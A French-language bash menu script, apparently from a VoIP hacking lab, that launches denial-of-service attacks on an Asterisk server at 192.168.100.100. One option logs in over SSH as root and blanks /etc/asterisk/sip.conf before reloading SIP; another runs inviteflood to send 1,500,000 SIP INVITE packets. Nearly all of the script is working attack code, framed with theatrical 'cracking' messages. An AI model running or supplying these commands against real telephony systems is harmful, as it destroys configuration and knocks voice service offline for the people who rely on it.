#!/bin/bash

confVide () {
	echo "CRACK DE LA CONNEXION SSH EN COURS..."
	sleep 3 
	echo "ALTERATiON DES FICHIERS DE CONFIGURATION EN COURS..."
	sleep 2
	ssh -t root@192.168.100.100 'echo "">/etc/asterisk/sip.conf && asterisk -rx "sip reload"'
	echo "Success de l'alteration de la configuration"
}


confAltere () {
	while [ true ]
do

		echo ""
		echo -e "\t\t\t[Déni de Service]"
		echo -e "\t\t     [Altération de config]"
		echo -e "\t\t[1] Normal (Fonctionnement)"
		echo -e "\t\t[2] Alteration de configuration"
		echo -e "\t\t[q] Quitter"
		echo ""
	
		read -p '[Déni de Service]=>' choix
	
		case $choix in
			1) /var/voiphack/conf/sysupdate.sh correct;;
			2) confVide;;
			q) exit;;
		esac

done
}


inviteFlood () {
	echo "Lancement de l'attaque ..."
	inviteflood eth0 user 192.168.100.100 192.168.100.100 1500000
	echo "Fin de l'attaque "
}


while [ true ]
do

		echo ""
		echo -e "\t\t\t[Déni de Service]"
		echo -e "\t\t\t [Choix attaque]"
		echo -e "\t\t[1] Alteration de configuration"
		echo -e "\t\t[2] Invite Flood"
		echo -e "\t\t[q] Quitter"
		echo ""
	
		read -p '[Déni de Service]=>' choix
	
		case $choix in
			1) confAltere;;
			2) inviteFlood;;
			q) exit;;
		esac

done
